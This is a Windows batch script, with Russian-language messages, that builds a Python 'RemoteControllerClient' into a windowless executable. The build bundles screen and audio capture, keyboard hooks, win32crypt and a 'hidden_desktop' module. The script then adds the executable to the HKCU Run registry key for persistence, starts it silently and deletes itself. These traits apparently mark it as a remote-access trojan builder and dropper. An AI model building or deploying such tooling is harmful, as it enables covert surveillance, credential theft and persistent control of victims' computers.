@echo off
setlocal

set "SCRIPT_DIR=%~dp0"
set "LOG_PATH=%SCRIPT_DIR%build_silent.log"

> "%LOG_PATH%" echo [Remote Controller] Silent build log

pushd "%SCRIPT_DIR%"

where python >nul 2>nul
if errorlevel 1 (
    echo Python не найден. Установите Python 3.11+ и повторите запуск.
    popd
    exit /b 1
)

if not exist ".venv\\Scripts\\activate.bat" (
    python -m venv .venv >> "%LOG_PATH%" 2>&1
    if errorlevel 1 (
        echo Не удалось создать виртуальное окружение. См. %LOG_PATH%
        popd
        exit /b 1
    )
)

call .venv\\Scripts\\activate.bat

python -m pip install --upgrade pip setuptools wheel >> "%LOG_PATH%" 2>&1
if errorlevel 1 (
    echo Ошибка обновления pip. См. %LOG_PATH%
    popd
    exit /b 1
)

set "REQ_FILE=%SCRIPT_DIR%..\\requirements.txt"
if exist "%REQ_FILE%" (
    python -m pip install -r "%REQ_FILE%" >> "%LOG_PATH%" 2>&1
) else (
    python -m pip install -r requirements-client.txt >> "%LOG_PATH%" 2>&1
)
if errorlevel 1 (
    echo Ошибка установки зависимостей. См. %LOG_PATH%
    popd
    exit /b 1
)

python -m pip install pyinstaller >> "%LOG_PATH%" 2>&1
if errorlevel 1 (
    echo Ошибка установки PyInstaller. См. %LOG_PATH%
    popd
    exit /b 1
)

pyinstaller --onefile --name RemoteControllerClient --clean --noconsole --log-level WARN ^
    --collect-all av ^
    --collect-all aiortc ^
    --collect-all sounddevice ^
    --collect-all mss ^
    --collect-all numpy ^
    --hidden-import=win32crypt ^
    --hidden-import=cryptography ^
    --hidden-import=pynput ^
    --hidden-import=pynput.mouse ^
    --hidden-import=pynput.keyboard ^
    --hidden-import=remote_client.windows.hidden_desktop ^
    client.py >> "%LOG_PATH%" 2>&1
if errorlevel 1 (
    echo Ошибка сборки. См. %LOG_PATH%
    popd
    exit /b 1
)

set "EXE_PATH=%SCRIPT_DIR%dist\\RemoteControllerClient.exe"
if not exist "%EXE_PATH%" (
    echo Не найден файл %EXE_PATH%
    popd
    exit /b 1
)

if exist "%SCRIPT_DIR%start_silent.vbs" (
    copy /y "%SCRIPT_DIR%start_silent.vbs" "%SCRIPT_DIR%dist\start_silent.vbs" >nul
)


reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RemoteControllerClient" /t REG_SZ /d "\"%EXE_PATH%\"" /f >nul
start "" "%EXE_PATH%"

popd
start "" /b cmd /c "ping 127.0.0.1 -n 2 > nul & del \"%~f0\""
endlocal
